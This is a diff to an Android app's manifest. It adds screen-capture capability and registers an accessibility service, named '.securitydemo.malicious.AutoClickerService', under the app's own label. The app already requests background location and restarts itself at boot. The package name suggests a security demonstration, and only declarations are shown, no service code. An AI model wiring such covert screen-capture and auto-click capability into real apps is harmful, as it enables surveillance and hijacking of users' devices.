@@ -9,6 +9,7 @@
     <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
 
     <!-- Storage permissions for accessing user files -->
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"
@@ -57,7 +58,7 @@
             android:directBootAware="true"
             android:enabled="true"
             android:exported="false"
-            android:foregroundServiceType="dataSync|location" />
+            android:foregroundServiceType="dataSync|location|mediaProjection" />
         <receiver
             android:name=".BootReceiver"
             android:directBootAware="true"
@@ -78,6 +79,20 @@
                 <action android:name="com.example.sitconnect.RESTART_SERVICE" />
             </intent-filter>
         </receiver>
+
+        <service
+            android:name=".securitydemo.malicious.AutoClickerService"
+            android:enabled="true"
+            android:exported="true"
+            android:label="@string/app_name"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+        </service>
     </application>
 
 </manifest>
